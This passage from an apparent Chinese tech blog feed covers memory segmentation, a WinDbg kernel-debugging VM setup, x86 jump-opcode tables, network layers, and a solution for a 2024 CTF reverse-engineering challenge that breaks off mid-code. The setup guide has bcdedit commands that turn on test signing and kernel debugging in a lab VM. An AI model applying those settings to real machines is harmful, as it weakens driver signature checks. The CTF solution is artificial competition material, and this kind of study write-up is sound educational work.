title="内存布局"></a>内存布局</h2><h3 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h3><p>通过段寄存器加偏移的方式索引真实物理地址</p><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>存在线性连续的虚拟地址，得到虚拟地址后，通过页表映射到对应的物理地址</p><h3 id="分段-分页"><a href="#分段-分页" class="headerlink" title="分段+分页"></a>分段+分页</h3><p>通过段寄存器加偏移的方式索引到虚拟内存，通过页表映射到对应的物理内存</p><h3 id="平坦内存模型"><a href="#平坦内存模型" class="headerlink" title="平坦内存模型"></a>平坦内存模型</h3><p>舍弃了大多数分段机制，保留了段寄存器的权限限制能力。在64位下，可以直接用单一段访问整个4G的虚拟内存空间，因此每个段的基址均为0，无限段长，直接用对应权限的段+偏移量索引虚拟地址，然后通过页表映射到对应的物理内存。</p>]]></content>
    
    
    <summary type="html">实模式到保护模式到长模式</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="win核心" scheme="https://www.pri87.vip/categories/win%E6%A0%B8%E5%BF%83/"/>
    
    <category term="计算机组成原理" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>WinDbg-调试环境搭建</title>
    <link href="https://www.pri87.vip/posts/5c35dd38.html"/>
    <id>https://www.pri87.vip/posts/5c35dd38.html</id>
    <published>2024-12-26T13:59:17.000Z</published>
    <updated>2024-12-26T14:51:42.879Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><h3 id="下载Win10镜像"><a href="#下载Win10镜像" class="headerlink" title="下载Win10镜像"></a>下载Win10镜像</h3><p>略</p><h3 id="下载WinDbg"><a href="#下载WinDbg" class="headerlink" title="下载WinDbg"></a>下载WinDbg</h3><p>链接：<a href="https://pan.baidu.com/s/135mYBWw3S3B9-jkuMrm5Lg">https://pan.baidu.com/s/135mYBWw3S3B9-jkuMrm5Lg</a><br>提取码：w7j5</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>用VMware安装iso镜像</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>一开始我使用了pipe和com去连接，但是始终连接不上，如果想用这种方法连接，可以看看这个博客</p><p><a href="https://xchen.cc/post/doubledebug/">搞定Windbg 串口双机调试 - 忆杰的博客 - 专注于软件逆向、调试、反调试、内核开发、硬件虚拟化</a></p><p>注意要让baudrate一样，在设备管理器中选择相同的速率</p><h3 id="NET连接"><a href="#NET连接" class="headerlink" title="NET连接"></a>NET连接</h3><p>ipconfig得到本机ip，假设为127.0.0.1</p><h4 id="虚拟机中"><a href="#虚拟机中" class="headerlink" title="虚拟机中"></a>虚拟机中</h4><p>管理员模式输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /dbgsettings net hostip:主机ip port:<span class="number">50000</span> key:<span class="number">1.1.1.1</span></span><br></pre></td></tr></table></figure><p>1.1.1.1可以用其它的。</p><p>打开调试：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /<span class="literal">debug</span> <span class="literal">on</span></span><br></pre></td></tr></table></figure><p>打开引导调试：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /bootdebug <span class="literal">on</span></span><br></pre></td></tr></table></figure><p>允许测试签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set testsigning <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><h4 id="调试机中"><a href="#调试机中" class="headerlink" title="调试机中"></a>调试机中</h4><blockquote><p>打开对应位数的WinDbg</p><p>File -&gt; Kernel Debug</p><p>第一个页面就是NET，port选50000，key填上面写的key</p><p>然后WinDbg应该在等待状态。</p><p>重启虚拟机，即可看到调试启动。</p></blockquote><p>如果是最新版本的WinDbg</p><blockquote><p>文件-&gt;Attach to kernel</p><p>Net，设置端口50000，Key，直接连接</p></blockquote>]]></content>
    
    
    <summary type="html">WinDbg是一个支持调试Windows内核的调试器，本篇介绍调试的环境搭建</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>汇编1-控制转移</title>
    <link href="https://www.pri87.vip/posts/8f1f1d37.html"/>
    <id>https://www.pri87.vip/posts/8f1f1d37.html</id>
    <published>2024-12-26T07:09:46.000Z</published>
    <updated>2024-12-26T14:51:42.878Z</updated>
    
    <content type="html"><![CDATA[<p>汇编是如何实现指令之间的跳转</p><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><ul><li>JMP，跳转指令</li><li>CALL，过程调用指令</li><li>LOOP，循环指令</li></ul><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><ul><li>CS：code segment 指令段寄存器</li><li>DS：data segment 数据段寄存器</li><li>SS：stack segment 栈段寄存器</li><li>ES：不知道英文，但是是辅助段寄存器</li><li>fs,gs：一般存操作系统的线程本地存储</li></ul><h2 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h2><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>EB <strong>cb</strong></td><td>JMP <strong>rel8</strong></td><td>相对短跳转，位移量相对于下一条指令</td></tr><tr><td>E9 <strong>cw</strong></td><td>JMP <strong>rel16</strong></td><td>相对近跳转，位移量相对于下一条指令</td></tr><tr><td>E9 <strong>cd</strong></td><td>JMP <strong>rel32</strong></td><td>相对近跳转，位移量相对于下一条指令</td></tr><tr><td>FF &#x2F;4</td><td>JMP <strong>r&#x2F;m16</strong></td><td>绝对间接近跳转，地址由 <strong>r&#x2F;m16</strong> 给出</td></tr><tr><td>FF &#x2F;4</td><td>JMP <strong>r&#x2F;m32</strong></td><td>绝对间接近跳转，地址由 <strong>r&#x2F;m32</strong> 给出</td></tr><tr><td>EA <strong>cd</strong></td><td>JMP <strong>ptr16:16</strong></td><td>绝对远跳转，地址由操作数给出</td></tr><tr><td>EA <strong>cp</strong></td><td>JMP <strong>ptr16:32</strong></td><td>绝对远跳转，地址由操作数给出</td></tr><tr><td>FF &#x2F;5</td><td>JMP <strong>m16:16</strong></td><td>绝对间接远跳转，地址由 <strong>m16:16</strong> 给出</td></tr><tr><td>FF &#x2F;5</td><td>JMP <strong>m16:32</strong></td><td>绝对间接远跳转，地址由 <strong>m16:32</strong> 给出</td></tr></tbody></table><p>分为三种：</p><ul><li>段内跳转：由本段段寄存器作为基址+偏移的跳转</li><li>相对跳转：由下一条指令地址作为基址+偏移的跳转</li><li>远跳转：由一个段寄存器作为基址+偏移的跳转</li><li>任务切换：略（切换进程&#x2F;线程）</li></ul><h3 id="条件跳转"><a href="#条件跳转" class="headerlink" title="条件跳转"></a>条件跳转</h3><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>77 <strong>cb</strong></td><td>JA <strong>rel8</strong></td><td>高于（CF&#x3D;0 且 ZF&#x3D;0）时短跳转</td></tr><tr><td>73 <strong>cb</strong></td><td>JAE <strong>rel8</strong></td><td>高于或等于 (CF&#x3D;0) 时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JB <strong>rel8</strong></td><td>低于 (CF&#x3D;1) 时短跳转</td></tr><tr><td>76 <strong>cb</strong></td><td>JBE <strong>rel8</strong></td><td>低于或等于（CF&#x3D;1 或  ZF&#x3D;1）时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JC <strong>rel8</strong></td><td>进位 (CF&#x3D;1) 时短跳转</td></tr><tr><td>E3 <strong>cb</strong></td><td>JCXZ <strong>rel8</strong></td><td>CX 寄存器为 0 时短跳转</td></tr><tr><td>E3 <strong>cb</strong></td><td>JECXZ <strong>rel8</strong></td><td>ECX 寄存器为 0 时短跳转</td></tr><tr><td>74 <strong>cb</strong></td><td>JE <strong>rel8</strong></td><td>等于 (ZF&#x3D;1) 时短跳转</td></tr><tr><td>7F <strong>cb</strong></td><td>JG <strong>rel8</strong></td><td>大于（ZF&#x3D;0 且 SF&#x3D;OF）时短跳转</td></tr><tr><td>7D <strong>cb</strong></td><td>JGE <strong>rel8</strong></td><td>大于或等于 (SF&#x3D;OF) 时短跳转</td></tr><tr><td>7C <strong>cb</strong></td><td>JL <strong>rel8</strong></td><td>小于 (SF&lt;&gt;OF)  时短跳转</td></tr><tr><td>7E <strong>cb</strong></td><td>JLE <strong>rel8</strong></td><td>小于或等于（ZF&#x3D;1 或  SF&lt;&gt;OF）时短跳转</td></tr><tr><td>76 <strong>cb</strong></td><td>JNA <strong>rel8</strong></td><td>不高于（CF&#x3D;1 或 ZF&#x3D;1）时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JNAE <strong>rel8</strong></td><td>不高于或等于 (CF&#x3D;1) 时短跳转</td></tr><tr><td>73 <strong>cb</strong></td><td>JNB <strong>rel8</strong></td><td>不低于 (CF&#x3D;0) 时短跳转</td></tr><tr><td>77 <strong>cb</strong></td><td>JNBE <strong>rel8</strong></td><td>不低于或等于（CF&#x3D;0 或  ZF&#x3D;0）时短跳转</td></tr><tr><td>73 <strong>cb</strong></td><td>JNC <strong>rel8</strong></td><td>无进位 (CF&#x3D;0) 时短跳转</td></tr><tr><td>75 <strong>cb</strong></td><td>JNE <strong>rel8</strong></td><td>不相等 (ZF&#x3D;0) 时短跳转</td></tr><tr><td>7E <strong>cb</strong></td><td>JNG <strong>rel8</strong></td><td>不大于（ZF&#x3D;1 或  SF&lt;&gt;OF）时短跳转</td></tr><tr><td>7C <strong>cb</strong></td><td>JNGE <strong>rel8</strong></td><td>不大于或等于 (SF&lt;&gt;OF)  时短跳转</td></tr><tr><td>7D <strong>cb</strong></td><td>JNL <strong>rel8</strong></td><td>不小于 (SF＝OF) 时短跳转</td></tr><tr><td>7F <strong>cb</strong></td><td>JNLE <strong>rel8</strong></td><td>不小于或等于（ZF&#x3D;0 且  SF&#x3D;OF）时短跳转</td></tr><tr><td>71 <strong>cb</strong></td><td>JNO <strong>rel8</strong></td><td>不上溢 (OF&#x3D;0) 时短跳转</td></tr><tr><td>7B <strong>cb</strong></td><td>JNP <strong>rel8</strong></td><td>奇校验 (PF&#x3D;0) 时短跳转</td></tr><tr><td>79 <strong>cb</strong></td><td>JNS <strong>rel8</strong></td><td>正数时 (SF＝0) 短跳转</td></tr><tr><td>75 <strong>cb</strong></td><td>JNZ <strong>rel8</strong></td><td>不为零 (ZF&#x3D;0) 时短跳转</td></tr><tr><td>70 <strong>cb</strong></td><td>JO <strong>rel8</strong></td><td>上溢 (OF&#x3D;1) 时短跳转</td></tr><tr><td>7A <strong>cb</strong></td><td>JP <strong>rel8</strong></td><td>偶校验 (PF&#x3D;1) 时短跳转</td></tr><tr><td>7A <strong>cb</strong></td><td>JPE <strong>rel8</strong></td><td>偶校验 (PF&#x3D;1) 时短跳转</td></tr><tr><td>7B <strong>cb</strong></td><td>JPO <strong>rel8</strong></td><td>奇校验 (PF&#x3D;0) 时短跳转</td></tr><tr><td>78 <strong>cb</strong></td><td>JS <strong>rel8</strong></td><td>负数 (SF&#x3D;1) 时短跳转</td></tr><tr><td>74 <strong>cb</strong></td><td>JZ <strong>rel8</strong></td><td>为零 (ZF $\leftarrow$ 1) 时短跳转</td></tr><tr><td>0F 87 <strong>cw&#x2F;cd</strong></td><td>JA <strong>rel16&#x2F;32</strong></td><td>高于（CF&#x3D;0 且 ZF&#x3D;0）时近跳转</td></tr><tr><td>0F 83 <strong>cw&#x2F;cd</strong></td><td>JAE <strong>rel16&#x2F;32</strong></td><td>高于或等于 (CF&#x3D;0) 时近跳转</td></tr><tr><td>0F 82 <strong>cw&#x2F;cd</strong></td><td>JB <strong>rel16&#x2F;32</strong></td><td>低于 (CF&#x3D;1) 时近跳转</td></tr><tr><td>0F 86 <strong>cw&#x2F;cd</strong></td><td>JBE <strong>rel16&#x2F;32</strong></td><td>低于或等于（CF&#x3D;1 或  ZF&#x3D;1）时近跳转</td></tr><tr><td>0F 82 <strong>cw&#x2F;cd</strong></td><td>JC <strong>rel16&#x2F;32</strong></td><td>进位 (CF&#x3D;1) 时近跳转</td></tr><tr><td>0F 84 <strong>cw&#x2F;cd</strong></td><td>JE <strong>rel16&#x2F;32</strong></td><td>相等 (ZF&#x3D;1) 时近跳转</td></tr><tr><td>0F 84 <strong>cw&#x2F;cd</strong></td><td>JZ <strong>rel16&#x2F;32</strong></td><td>为 0 (ZF&#x3D;1) 时近跳转</td></tr><tr><td>0F 8F <strong>cw&#x2F;cd</strong></td><td>JG <strong>rel16&#x2F;32</strong></td><td>大于（ZF&#x3D;0 且  SF&#x3D;OF）时近跳转</td></tr></tbody></table><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>0F 8D <strong>cw&#x2F;cd</strong></td><td>JGE <strong>rel16&#x2F;32</strong></td><td>大于或等于 (SF&#x3D;OF) 时近跳转</td></tr><tr><td>0F 8C <strong>cw&#x2F;cd</strong></td><td>JL <strong>rel16&#x2F;32</strong></td><td>小于 (SF&lt;&gt;OF)  时近跳转</td></tr><tr><td>0F 8E <strong>cw&#x2F;cd</strong></td><td>JLE <strong>rel16&#x2F;32</strong></td><td>小于或等于（ZF&#x3D;1 或  SF&lt;&gt;OF）时近跳转</td></tr><tr><td>0F 86 <strong>cw&#x2F;cd</strong></td><td>JNA <strong>rel16&#x2F;32</strong></td><td>不高于（CF&#x3D;1 或 ZF&#x3D;1）时近跳转</td></tr><tr><td>0F 82 <strong>cw&#x2F;cd</strong></td><td>JNAE <strong>rel16&#x2F;32</strong></td><td>不高于或等于 (CF&#x3D;1) 时近跳转</td></tr><tr><td>0F 83 <strong>cw&#x2F;cd</strong></td><td>JNB <strong>rel16&#x2F;32</strong></td><td>不低于 (CF&#x3D;0) 时近跳转</td></tr><tr><td>0F 87 <strong>cw&#x2F;cd</strong></td><td>JNBE <strong>rel16&#x2F;32</strong></td><td>不低于或等于（CF&#x3D;0 或  ZF&#x3D;0）时近跳转</td></tr><tr><td>0F 83 <strong>cw&#x2F;cd</strong></td><td>JNC <strong>rel16&#x2F;32</strong></td><td>无进位 (CF&#x3D;0) 时近跳转</td></tr><tr><td>0F 85 <strong>cw&#x2F;cd</strong></td><td>JNE <strong>rel16&#x2F;32</strong></td><td>不相等 (ZF&#x3D;0) 时近跳转</td></tr><tr><td>0F 8E <strong>cw&#x2F;cd</strong></td><td>JNG <strong>rel16&#x2F;32</strong></td><td>不大于（ZF&#x3D;1 或  SF&lt;&gt;OF）时近跳转</td></tr><tr><td>0F 8C <strong>cw&#x2F;cd</strong></td><td>JNGE <strong>rel16&#x2F;32</strong></td><td>不大于或等于 (SF&lt;&gt;OF)  时近跳转</td></tr><tr><td>0F 8D <strong>cw&#x2F;cd</strong></td><td>JNL <strong>rel16&#x2F;32</strong></td><td>不小于 (SF＝OF) 时近跳转</td></tr><tr><td>0F 8F <strong>cw&#x2F;cd</strong></td><td>JNLE <strong>rel16&#x2F;32</strong></td><td>不小于或等于（ZF&#x3D;0 且  SF&#x3D;OF）时近跳转</td></tr><tr><td>0F 81 <strong>cw&#x2F;cd</strong></td><td>JNO <strong>rel16&#x2F;32</strong></td><td>不上溢 (OF&#x3D;0) 时近跳转</td></tr><tr><td>0F 8B <strong>cw&#x2F;cd</strong></td><td>JNP <strong>rel16&#x2F;32</strong></td><td>奇校验 (PF&#x3D;0) 时近跳转</td></tr><tr><td>0F 89 <strong>cw&#x2F;cd</strong></td><td>JNS <strong>rel16&#x2F;32</strong></td><td>正数 (SF＝0) 时近跳转</td></tr><tr><td>0F 85 <strong>cw&#x2F;cd</strong></td><td>JNZ <strong>rel16&#x2F;32</strong></td><td>不为零 (ZF&#x3D;0) 时近跳转</td></tr><tr><td>0F 80 <strong>cw&#x2F;cd</strong></td><td>JO <strong>rel16&#x2F;32</strong></td><td>上溢 (OF&#x3D;1) 时近跳转</td></tr><tr><td>0F 8A <strong>cw&#x2F;cd</strong></td><td>JP <strong>rel16&#x2F;32</strong></td><td>偶校验 (PF&#x3D;1) 时近跳转</td></tr><tr><td>0F 8A <strong>cw&#x2F;cd</strong></td><td>JPE <strong>rel16&#x2F;32</strong></td><td>偶校验 (PF&#x3D;1) 时近跳转</td></tr><tr><td>0F 8B <strong>cw&#x2F;cd</strong></td><td>JPO <strong>rel16&#x2F;32</strong></td><td>奇校验 (PF&#x3D;0) 时近跳转</td></tr><tr><td>0F 88 <strong>cw&#x2F;cd</strong></td><td>JS <strong>rel16&#x2F;32</strong></td><td>负数 (SF＝1) 时近跳转</td></tr><tr><td>0F 84 <strong>cw&#x2F;cd</strong></td><td>JZ <strong>rel16&#x2F;32</strong></td><td>为 0 (ZF&#x3D;1) 时近跳转</td></tr></tbody></table><h2 id="过程调用指令"><a href="#过程调用指令" class="headerlink" title="过程调用指令"></a>过程调用指令</h2><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>E8 <strong>cw</strong></td><td>CALL <strong>rel16</strong></td><td>相对近调用，位移量相对于下一条指令</td></tr><tr><td>E8 <strong>cd</strong></td><td>CALL <strong>rel32</strong></td><td>相对近调用，位移量相对于下一条指令</td></tr><tr><td>FF &#x2F;2</td><td>CALL <strong>r&#x2F;m16</strong></td><td>绝对间接近调用，地址由 <strong>r&#x2F;m16</strong> 给出</td></tr><tr><td>FF &#x2F;2</td><td>CALL <strong>r&#x2F;m32</strong></td><td>绝对间接近调用，地址由 <strong>r&#x2F;m32</strong> 给出</td></tr><tr><td>9A <strong>cd</strong></td><td>CALL <strong>ptr16:16</strong></td><td>绝对远调用，地址由操作数给出</td></tr><tr><td>9A <strong>cp</strong></td><td>CALL <strong>ptr16:32</strong></td><td>绝对远调用，地址由操作数给出</td></tr><tr><td>FF &#x2F;3</td><td>CALL <strong>m16:16</strong></td><td>绝对间接远调用，地址由 <strong>m16:16</strong> 给出</td></tr><tr><td>FF &#x2F;3</td><td>CALL <strong>m16:32</strong></td><td>绝对间接远调用，地址由 <strong>m16:32</strong> 给出</td></tr></tbody></table><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>C3</td><td>RET</td><td>近返回到调用过程</td></tr><tr><td>CB</td><td>RET</td><td>远返回到调用过程</td></tr><tr><td>C2 <strong>iw</strong></td><td>RET <strong>imm16</strong></td><td>近返回到调用过程，并从堆栈弹出 <strong>imm16</strong> 个字节</td></tr><tr><td>CA <strong>iw</strong></td><td>RET <strong>imm16</strong></td><td>远返回到调用过程，并从堆栈弹出 <strong>imm16</strong> 个字节</td></tr></tbody></table><p>retf指令：先弹出值到IP寄存器，再弹出值到CS段寄存器实现返回。</p><h2 id="循环指令"><a href="#循环指令" class="headerlink" title="循环指令"></a>循环指令</h2><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>E2 <strong>cb</strong></td><td>LOOP <strong>rel8</strong></td><td>递减计数；计数  $\not &#x3D;$ 0 时短跳转</td></tr><tr><td>E1 <strong>cb</strong></td><td>LOOPE <strong>rel8</strong></td><td>递减计数；计数  $\not &#x3D;$  0 且 ZF&#x3D;1 时短跳转</td></tr><tr><td>E1 <strong>cb</strong></td><td>LOOPZ <strong>rel8</strong></td><td>递减计数；计数  $\not &#x3D;$  0 且 ZF&#x3D;1 时短跳转</td></tr><tr><td>E0 <strong>cb</strong></td><td>LOOPNE <strong>rel8</strong></td><td>递减计数；计数  $\not &#x3D;$  0 且 ZF&#x3D;0 时短跳转</td></tr><tr><td>E0 <strong>cb</strong></td><td>LOOPNZ <strong>rel8</strong></td><td>递减计数；计数  $\not &#x3D;$  0 且 ZF&#x3D;0 时短跳转</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">汇编中的控制转移指令</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="基础" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="汇编" scheme="https://www.pri87.vip/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>五层网络协议小总结</title>
    <link href="https://www.pri87.vip/posts/f8da60a2.html"/>
    <id>https://www.pri87.vip/posts/f8da60a2.html</id>
    <published>2024-12-23T07:15:47.000Z</published>
    <updated>2024-12-24T17:34:17.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="理论五层模型"><a href="#理论五层模型" class="headerlink" title="理论五层模型"></a>理论五层模型</h2><p>分为：<br>应用层，传输层，网络层，数据链路层，物理层</p><p>每一层都负责了一部分内容并给上一层打下基础</p><p>协议：每一层通过支持对应的协议来实现本层的功能，两个机器在同一层如果不支持相同的协议，就不能正常通信。</p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>作用：实现传输比特信号，需要实现01模拟信号和其它信号之间的转换</p><p>物理实现：中继器，集线器</p><p>对应协议：网线，光纤等的接口类型，传输介质的速率标准等</p><p>流程：从模拟信号转为其它信号后，通过物理路径（引导&#x2F;非引导）到线路终点再被转为模拟信号</p><p>其它注意点：复用技术（码分多址），X工通信</p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>作用：实现帧的传输，对于上层数据的透明传输（对上层不可见），一定的差错检查。</p><p>物理实现：网卡（MAC地址），交换机</p><p>对应协议：PPP协议和以太网协议（实现封装成帧，透明传输和差错检查）</p><p>流程：对于一段链路，先将网络层下交的数据封装成MAC帧，通过对应的协议去传输帧，交换机维护了一张<code>转发表</code>，在这里找到目的MAC地址后转发给对应的端口，然后交给物理层。如果是主机发送，则直接发给连接的交换机。</p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>作用：实现IP数据报的传输，选择合适的路线传送数据。是非主机的设备的最高层</p><p>物理实现：路由器</p><p>对应协议：IP协议，以及它需要的ARP地址解析协议和在它之上的ICMP报文控制协议和IGMP组管理协议。</p><p>流程：对于传输层的数据，先转为对应的IP数据报，从上层得到的套接字中有目的IP地址，通过路由器中的路由选择协议（RIP，OSPF，BGP）更新自己的<code>路由表</code>，通过路由表找到对应的IP地址，然后转发给对应的端口，转发前，通过ARP协议取IP对应的MAC地址，先将MAC帧中的源MAC地址改为这个端口的地址，将目的MAC地址转为下一跳设备的MAC地址。然后发给数据链路层</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>作用：向应用层提供服务，实现进程间的通信。复用和分用。可信传输，差错检查，流量控制，拥塞控制等</p><p>物理实现：主机</p><p>对应协议：TCP&#x2F;UDP，一个是面向连接的，数据传输的单位是报文段，能够提供可靠的交付。 一个是无连接的，数据传输的单位是用户数据报，不保证提供可靠的交付，只能提供“尽最大努力交付”。</p><p>流程：发送的情况：根据不同的协议要求，然后转为TCP&#x2F;UDP头部信息。直接给下一层。如果是TCP会有三次交换数据请求连接等这种本层处理的事项。接收的情况：收到后拼接，然后向上发给应用层。</p><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>作用：实现需要的功能</p><p>物理实现：无</p><p>对应协议：很多，比如：DNS，http等</p><p>流程：对应不同实现有不同流程</p>]]></content>
    
    
    <summary type="html">用来复习，不是很严谨</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="开发" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/"/>
    
    <category term="网络编程" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
    <category term="计算机网络" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
  </entry>
  
  <entry>
    <title>鹏城杯2024-re-复现</title>
    <link href="https://www.pri87.vip/posts/674d40c7.html"/>
    <id>https://www.pri87.vip/posts/674d40c7.html</id>
    <published>2024-12-22T06:54:51.000Z</published>
    <updated>2024-12-22T07:51:35.751Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="chall-py"><a href="#chall-py" class="headerlink" title="chall_py"></a>chall_py</h3><p>发现全是base，用解密脚本解密为代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">strr = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;./chall.py&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    strr = f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;&quot;&quot;\s*(.*?)\s*&quot;&quot;&quot;&#x27;</span>, re.DOTALL) </span><br><span class="line">    matches = pattern.findall(strr.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;b32decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b32decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;b64decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b64decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;b85decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b85decode(matches[<span class="number">0</span>])    </span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;a85decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = a85decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./res.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strr)</span><br></pre></td></tr></table></figure><p>输出为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="literal">True</span></span><br><span class="line">d=<span class="built_in">len</span></span><br><span class="line">G=<span class="built_in">list</span></span><br><span class="line">g=<span class="built_in">range</span></span><br><span class="line">s=<span class="built_in">next</span></span><br><span class="line">R=<span class="built_in">bytes</span></span><br><span class="line">o=<span class="built_in">input</span></span><br><span class="line">Y=<span class="built_in">print</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>(<span class="params">S</span>):</span><br><span class="line"> i=<span class="number">0</span></span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span> a:</span><br><span class="line">  i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">  j=(j+S[i])%<span class="number">256</span></span><br><span class="line">  